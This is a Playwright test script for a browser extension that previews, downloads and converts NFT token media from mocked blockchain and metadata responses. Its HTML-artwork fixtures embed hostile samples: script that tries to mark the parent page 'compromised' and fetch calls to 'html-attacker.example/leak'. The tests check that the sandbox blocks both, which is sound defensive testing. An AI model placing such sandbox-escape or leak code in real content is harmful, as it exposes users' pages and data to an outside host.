import { chromium } from 'playwright';
import { encodeAbiParameters } from 'viem';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, rm, readFile } from 'node:fs/promises';
import path from 'node:path';

await mkdir('test-results', { recursive: true });
const profile = await mkdtemp(path.resolve('test-results/media-profile-'));
const context = await chromium.launchPersistentContext(profile, {
  executablePath: process.env.CHROMIUM_EXECUTABLE || undefined,
  channel: process.env.CHROMIUM_EXECUTABLE ? undefined : 'chromium', headless: true,
  viewport: { width: 1100, height: 900 }, acceptDownloads: true,
  args: [`--disable-extensions-except=${path.resolve('extension')}`, `--load-extension=${path.resolve('extension')}`],
});
const base = 'https://gateway.pinata.cloud/media-test';
const contract = '0x0000000000000000000000000000000000000001';
const fixtures = { jpg: await readFile('tests/fixtures/wide.jpg'), gif: await readFile('tests/fixtures/moving.gif'), webp: await readFile('tests/fixtures/moving.webp') };
const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="10"><rect width="20" height="10" fill="red"/></svg>';
const htmlArtwork = '<!doctype html><meta charset="utf-8"><style>html,body{margin:0;height:100%;display:grid;place-items:center}canvas{width:100%;image-rendering:pixelated}</style><canvas width="32" height="16"></canvas><script>const c=document.querySelector("canvas"),ctx=c.getContext("2d");function frame(t){ctx.fillStyle=Math.floor(t/100)%2?"blue":"red";ctx.fillRect(0,0,32,16);ctx.fillStyle="lime";ctx.fillRect(16,0,16,16);requestAnimationFrame(frame)}requestAnimationFrame(frame);try{parent.document.body.dataset.compromised="yes"}catch{}fetch("https://html-attacker.example/leak").catch(()=>{});<\/script>';
const htmlMetadata = { name: 'Media 5', image: `data:image/svg+xml;base64,${Buffer.from(svg).toString('base64')}`, animation_url: `data:text/html;base64,${Buffer.from(htmlArtwork).toString('base64')}` };
const embeddedMetadata = { name: 'Media 4', image: `data:image/jpeg;base64,${fixtures.jpg.toString('base64')}`, animation_url: `data:image/gif;base64,${fixtures.gif.toString('base64')}` };
const brokenHtml = {
  6: '<script src="https://html-attacker.example/p5.min.js"></script>',
  7: '<script>throw new Error("Broken artwork fixture")</script>',
};
let rpcCalls = 0, metadataCalls = 0, releaseSlow, slowStarted, escapedRequests = 0;
const slowSeen = new Promise(resolve => { slowStarted = resolve; });
const slowGate = new Promise(resolve => { releaseSlow = resolve; });
const errors = [];
try {
  const worker = context.serviceWorkers()[0] || await context.waitForEvent('serviceworker');

  const extensionId = new URL(worker.url()).host;
  const page = await context.newPage();
  page.on('pageerror', error => errors.push(error.message));
  await context.route('https://html-attacker.example/**', route => { escapedRequests++; return route.abort(); });
  await context.route('https://ethereum-rpc.publicnode.com/**', async route => {
    rpcCalls++;
    const request = route.request().postDataJSON();
    const data = request.params?.[0]?.data;
    const result = request.method === 'eth_chainId' ? '0x1' : data.startsWith('0x01ffc9a7')
      ? encodeAbiParameters([{ type: 'bool' }], [true])
      : encodeAbiParameters([{ type: 'string' }], [BigInt('0x' + data.slice(-64)) === 4n
        ? `data:application/json;base64,${Buffer.from(JSON.stringify(embeddedMetadata)).toString('base64')}`
        : BigInt('0x' + data.slice(-64)) === 5n ? `data:application/json;base64,${Buffer.from(JSON.stringify(htmlMetadata)).toString('base64')}`
        : brokenHtml[BigInt('0x' + data.slice(-64))] ? `data:application/json,${encodeURIComponent(JSON.stringify({ name: 'Broken HTML fixture', image: `data:image/svg+xml,${encodeURIComponent(svg)}`, animation_url: `data:text/html,${encodeURIComponent(brokenHtml[BigInt('0x' + data.slice(-64))])}` }))}`
        : `${base}/${BigInt('0x' + data.slice(-64))}.json`]);
    await route.fulfill({ json: { jsonrpc: '2.0', id: request.id, result } });
  });
  await context.route(`${base}/**`, async route => {
    const name = new URL(route.request().url()).pathname.split('/').at(-1);
    if (name.endsWith('.json')) {
      metadataCalls++;
      const id = name.split('.')[0];
      const media = id === '2' ? { image: 'moving.gif', animation_url: 'moving.gif', media: { url: ' moving.gif ' }, properties: { files: [{ uri: 'moving.gif' }] } } : id === '3' ? { image_url: 'wide.jpg', animation_url: '{id}.gif' } : {
        image: 'wide.jpg', animation_url: 'moving.gif', image_data: svg,
        properties: { files: [{ uri: 'moving.webp' }, { uri: 'slow.gif' }, { uri: 'unsupported.mp4' }, { uri: 'https://media-denied.example/art.gif' }] },
      };
      await route.fulfill({ json: { name: `Media ${id}`, ...media } }); return;
    }
    if (name === 'slow.gif') { slowStarted(); await slowGate; }
    if (name === 'unsupported.mp4') { await route.fulfill({ contentType: 'video/mp4', body: 'unsupported' }); return; }
    const extension = name.split('.').at(-1);
    try { await route.fulfill({ contentType: `image/${extension === 'jpg' ? 'jpeg' : extension}`, body: fixtures[extension] }); } catch { /* Superseded request. */ }
  });
  await page.goto(`chrome-extension://${extensionId}/results.html`);
  await page.waitForFunction(() => document.querySelector('.shell')?.inert === false);
  async function submit(id, method = 'auto') {
    await page.locator('#contract').fill(contract); await page.locator('#token').fill(String(id)); await page.locator('#method').selectOption(method);
    await page.locator('#token').press('Enter');
    await page.waitForFunction(id => document.querySelector('#name').textContent === `Media ${id}` && (!document.querySelector('#image').hidden || document.querySelector('#media-type').textContent === 'HTML'), String(id));
  }
  async function select(field, type) {
    await page.locator('#media-source').selectOption(field);
    await page.waitForFunction(type => (!document.querySelector('#image').hidden || !document.querySelector('#html-stage').hidden) && document.querySelector('#media-type').textContent === type, type);
  }
  async function original(expected, extension) {
    await page.locator('#share-media').click();
    await page.waitForFunction(() => !document.querySelector('#download-media').hidden);
    const downloaded = page.waitForEvent('download'); await page.locator('#download-media').click();
    const file = await downloaded;
    assert.ok(file.suggestedFilename().endsWith(`--media.${extension}`));
    assert.deepEqual(await readFile(await file.path()), expected);
  }
  async function convert(format, animated) {
    if (animated) {
      await page.locator('#share-format').waitFor({ state: 'visible' });
      await page.locator('#share-format').selectOption(format);
    }
    await page.locator('#share-generate').click();
    await page.waitForFunction(() => !document.querySelector('#share-download').hidden);
    const output = await page.evaluate(async () => {
      const blob = await (await fetch(document.querySelector('#share-download').href)).blob();
      const decoder = new ImageDecoder({ data: await blob.arrayBuffer(), type: blob.type });
      await decoder.tracks.ready; await decoder.completed;
      const frames = decoder.tracks.selectedTrack.frameCount;
      const samples = []; let width, height, boundary;
      for (let i = 0; i < frames; i++) {
        const { image } = await decoder.decode({ frameIndex: i });
        width = image.displayWidth; height = image.displayHeight;
        const canvas = new OffscreenCanvas(image.displayWidth, image.displayHeight); const ctx = canvas.getContext('2d');
        ctx.drawImage(image, 0, 0); samples.push([...ctx.getImageData(0, 0, 1, 1).data].join(','));
        if (!i) boundary = [...ctx.getImageData(Math.floor(width / 2) - 1, 0, 2, 1).data];
        image.close();
      }
      decoder.close(); return { type: blob.type, frames, width, height, boundary, distinctFrames: new Set(samples).size };
    });
    assert.equal(output.type, `image/${format === 'jpg' ? 'jpeg' : format}`);
    assert.equal(output.frames > 1, animated);
    return output;
  }
  await submit(1);
  assert.equal(await page.locator('#media-source').inputValue(), 'animation_url');
  assert.equal(await page.locator('#media-type').textContent(), 'GIF');
  assert.equal(await page.locator('#media-source option').count(), 7);
  await select('image', 'JPEG');
  await original(fixtures.jpg, 'jpg'); await convert('jpg', false); await page.locator('#close-share-modal').click();
  const counts = [rpcCalls, metadataCalls];
  await select('animation_url', 'GIF');
  assert.equal(await page.locator('#image-link').getAttribute('href'), `${base}/moving.gif`);
  await page.locator('#fullscreen-media').click();
  assert.equal(await page.locator('#fullscreen-image').getAttribute('src'), await page.locator('#image').getAttribute('src'));
  await page.locator('#close-media-modal').click();
  await original(fixtures.gif, 'gif'); await convert('gif', true); await convert('webp', true); await page.locator('#close-share-modal').click();
  await select('properties.files[0]', 'WEBP'); await original(fixtures.webp, 'webp'); await convert('gif', true); await page.locator('#close-share-modal').click();
  await select('image_data', 'SVG');
  assert.equal(await page.locator('#media-caption').textContent(), '20 × 10');
  assert.equal(await page.locator('#image-link').isVisible(), false);
  await original(Buffer.from(svg), 'svg');
  const svgOutput = await convert('jpg', false);
  assert.equal(svgOutput.width, 2000); assert.equal(svgOutput.height, 1000);
  await page.locator('#close-share-modal').click();
  assert.deepEqual([rpcCalls, metadataCalls], counts);
  console.log('PASS selected image, animation, inline SVG and files share exact original downloads, fullscreen and conversion utilities without metadata refetch');

  await page.locator('#media-source').selectOption('properties.files[1]'); await slowSeen;
  await select('image', 'JPEG'); releaseSlow();
  await page.waitForTimeout(250);
  assert.equal(await page.locator('#media-type').textContent(), 'JPEG');
  assert.equal(await page.locator('#download-media').getAttribute('download'), `${contract}--1--media.jpg`);
  console.log('PASS superseded media requests cannot overwrite the preview or download');

  await page.locator('#media-source').selectOption('properties.files[2]');
  await page.waitForFunction(() => document.querySelector('#status').textContent.includes('not a supported image'));
  assert.equal(await page.locator('#image').isVisible(), false);
  assert.equal(await page.locator('#download-media').getAttribute('href'), null);
  assert.equal(await page.evaluate(() => window.mediaExecuted), undefined);
  await page.locator('#media-source').selectOption('properties.files[3]');
  await page.waitForFunction(() => !document.querySelector('#retry').hidden && document.querySelector('#retry').textContent === 'Allow and retry');
  await select('animation_url', 'GIF');
  assert.equal(await page.locator('#retry').isVisible(), false);
  console.log('PASS unsupported and permission-blocked assets do not retain previous media, and switching recovers');

  await submit(2);
  assert.equal(await page.locator('#media-source').isVisible(), false);
  assert.equal(await page.locator('#media-source option').count(), 1);
  assert.equal(await page.locator('#media-type').textContent(), 'GIF');
  await submit(3, 'uri'); await select('animation_url', 'GIF');
  assert.equal(await page.locator('#image-link').getAttribute('href'), `${base}/${'3'.padStart(64, '0')}.gif`);
  assert.equal(await page.locator('#method-badge').textContent(), 'ERC-1155');
  console.log('PASS identical media fields hide the selector; ERC-1155 substitution applies to distinct selected assets');

  await submit(4);
  assert.equal(await page.locator('.preview-footer #media-source').count(), 1);
  assert.equal(await page.locator('#media-source').inputValue(), 'animation_url');
  assert.equal(await page.locator('#media-type').textContent(), 'GIF');
  await select('image', 'JPEG');
  await original(fixtures.jpg, 'jpg'); await convert('jpg', false); await page.locator('#close-share-modal').click();
  await select('animation_url', 'GIF');
  assert.equal(await page.locator('#media-storage').getAttribute('data-location'), 'on-chain');
  await original(fixtures.gif, 'gif'); await convert('webp', true); await page.locator('#close-share-modal').click();
  console.log('PASS base64 image and animation in base64 token metadata preview, download and convert independently');

  await submit(5);
  assert.equal(await page.locator('#media-source').inputValue(), 'animation_url');
  assert.equal(await page.locator('#media-type').textContent(), 'HTML');
  assert.equal(await page.locator('#html-stage iframe').getAttribute('sandbox'), 'allow-scripts');
  assert.equal(await page.evaluate(() => document.body.dataset.compromised), undefined);
  await page.locator('#fullscreen-media').click();
  await page.locator('#fullscreen-stage iframe').waitFor({ state: 'attached' });
  assert.equal(await page.locator('#fullscreen-stage iframe').count(), 1);
  await page.locator('#close-media-modal').click();
  assert.equal(await page.locator('#html-stage iframe').count(), 1);
  await original(Buffer.from(htmlArtwork), 'html');
  await page.locator('#share-svg-duration').fill('0.4');
  for (const format of ['gif', 'webp']) {
    const htmlOutput = await convert(format, true);
    assert.ok(htmlOutput.distinctFrames > 1);
    assert.equal(htmlOutput.width, 2000); assert.equal(htmlOutput.height, 1000);
    if (format === 'gif') assert.deepEqual(htmlOutput.boundary, [255, 0, 0, 255, 0, 255, 0, 255], 'pixel-art edges must remain sharp at 2000 px');
  }
  await page.locator('#close-share-modal').click();
  await select('image', 'SVG');
  assert.equal(await page.locator('#html-stage iframe').count(), 0);
  assert.equal(escapedRequests, 0);
  console.log('PASS embedded HTML previews in isolation, enters fullscreen, downloads unchanged, converts changing canvas frames, and cleans up on selection');

  for (const [id, message] of [[6, 'unsupported external script'], [7, 'Broken artwork fixture']]) {
    await page.locator('#token').fill(String(id)); await page.locator('#token').press('Enter');
    await page.waitForFunction(message => document.querySelector('#status').textContent.includes(message), message);
    assert.equal(await page.locator('#media-source').inputValue(), 'animation_url');
    assert.equal(await page.locator('#html-stage iframe').count(), 0);
    await select('image', 'SVG');
    assert.equal(await page.locator('#status').textContent(), '');
  }
  assert.equal(escapedRequests, 0);
  console.log('PASS unsupported dependencies and startup errors show useful errors; selecting image recovers without external script requests');

  await submit(1);
  await page.setViewportSize({ width: 390, height: 844 });
  await page.screenshot({ path: 'test-results/media-source-narrow.png', fullPage: true });
  assert.equal(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth), true);
  assert.deepEqual(errors, []);
  console.log('PASS media selector fits narrow layouts without script errors');
} finally {
  releaseSlow(); await context.close(); await rm(profile, { recursive: true, force: true });
}
